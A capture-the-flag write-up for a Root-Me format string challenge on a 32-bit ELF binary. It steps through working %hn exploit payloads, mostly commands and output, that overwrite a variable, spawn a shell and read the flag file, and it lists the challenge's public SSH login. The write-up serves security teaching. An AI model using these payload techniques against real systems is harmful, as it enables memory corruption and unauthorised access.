# ELF x86 - Format string bug basic 2
https://www.root-me.org/en/Challenges/App-System/ELF-x86-Format-string-bug-basic-2
```
Environment configuration :
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 No 
NX 	Non-Executable Stack 	                 YES 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes 

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	SSH
Port	        2222
SSH access 	ssh -p 2222 app-systeme-ch5@challenge02.root-me.org  
Username	app-systeme-ch14
Password	app-systeme-ch14
```
According to the source, the goal is to change the variable _check_ from 0x04030201 to 0xdeadbeef using string format vulnerability.<br>
The vulnerable code is at line 25:
```c
snprintf( fmt, sizeof(fmt), argv[1] );
```
Which enables an attacker to control the **fmt** argument of _snprintf_.<br>
Let's verify it quickly:
```sh
app-systeme-ch14@challenge02:~$ ./ch14 %08x.%08x.%08x.%08x
check at 0xbffffb08
argv[1] = [%08x.%08x.%08x.%08x]
fmt=[b7fdc4a0.00000001.00000000.00000001]
check=0x4030201
```
As one may notice, the **fmt** value is set to the 4 values (which were popped) in the stack.<br><br>
First thing to do is to check what is the offset to the **fmt** value. After few tries, one can find out:
```sh
app-systeme-ch14@challenge02:~$ ./ch14 "AAAA %x %x %x %x %x %x %x %x %x"
check at 0xbffffaf8
argv[1] = [AAAA %x %x %x %x %x %x %x %x %x]
fmt=[AAAA b7fdc4a0 1 0 1 bffffc24 0 0 4030201 41414141]
check=0x4030201
```
That the **fmt** is 8 stack values away. The **check** address is already provided by the program (0xbffffae8 for the first nimble and 0xbffffaea for the second)<br>
Now Let's try to check the first nimble to 0xbeef:
```sh
app-systeme-ch14@challenge02:~$ ./ch14 `python -c "print '\xf8\xfa\xff\xbf' + '%10x' + '%8x'*7 + '%hn' "`
check at 0xbffffaf8
argv[1] = [����%10x%8x%8x%8x%8x%8x%8x%8x%hn]

You are on the right way !
fmt=[����  b7fdc4a0       1       0       1bffffc24       0       0 4030201]
check=0x4030046
```
Let me explain a bit.<br>
First, the **check**'s first nimble address is inserted to format string.<br>
Then, a ```%10x``` is suppose to print the current value in the stack with 10 bytes at least (10 bytes).<br>
Afterward, the seven ```%8x``` are popping the 7 elements left until the **fmt** address (the 8 in ```%8x``` is for controlling the length and avoiding random lengths).<br>
And for last there is the infamous ```%hn```. According to the [printf documentation](http://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html) the "n" should write the number of bytes in the output until this point into the given integer.<br><br>

Therefore, because we entered the **check** address it writes 4 bytes of the address, 10 bytes (```%10x```) and 7 8-bytes (```'%8x'*7```). 
Which means the first nimble of **check** should contain 4+10+7*8=14+56=70=0x46 (it fits the **check**'s value).<br><br>

So, inorder to change the first nimble to 0xbeef, one should change the ```%10x``` to ```%48819x```:
```sh
app-systeme-ch14@challenge02:~$ ./ch14 `python -c "print '\xf8\xfa\xff\xbf' + '%48819x' + '%8x'*7 + '%hn' "`
check at 0xbffffaf8
argv[1] = [����%48819x%8x%8x%8x%8x%8x%8x%8x%hn]

You are on the right way !
fmt=[����                                                                                                                           ]
check=0x403beef
```

Now it's time to change the second nimble.<br>
First, we'll enter its address and some junk to the buffer and adjust the ```%48819x``` (to ```%48811x```).
And finally, let's try as before to change the second nimble:
```sh
app-systeme-ch14@challenge02:~$ ./ch14 `python -c "print '\xf8\xfa\xff\xbf' + 'AAAA' + '\xfa\xfa\xff\xbf' + '%48815u' + '%8x'*7 + '%hn' + '%10x' + '%hn'"`
check at 0xbffffae8
argv[1] = [����AAAA����%48815u%8x%8x%8x%8x%8x%8x%8x%hn%10x%hn]
fmt=[����AAAA��������                                                                                                               ]
check=0x46beef
```
For setting the second nimble to 0xdead, we should take 0xdead and subtract from it 8 (first nimble's address and 'AAAA'), 48815 (from ```%48815u```) and 56 (```'%8x'*7```).
So, 57005-8-48815-56 = 8126. Let's try it out:
```sh
app-systeme-ch14@challenge02:~$ ./ch14 `python -c "print '\xf8\xfa\xff\xbf' + 'AAAA' + '\xfa\xfa\xff\xbf' + '%48815u' + '%8x'*7 + '%hn' + '%8126x' + '%hn'"`
check at 0xbffffae8
argv[1] = [����AAAA����%48815u%8x%8x%8x%8x%8x%8x%8x%hn%8126x%hn]
fmt=[����AAAA��������                                                                                                               ]
check=0xdeadbeef
Yeah dude ! You win !
$ id
uid=1214(app-systeme-ch14-cracked) gid=1114(app-systeme-ch14) groups=1114(app-systeme-ch14),100(users)
$ cat .passwd
<censored>
```
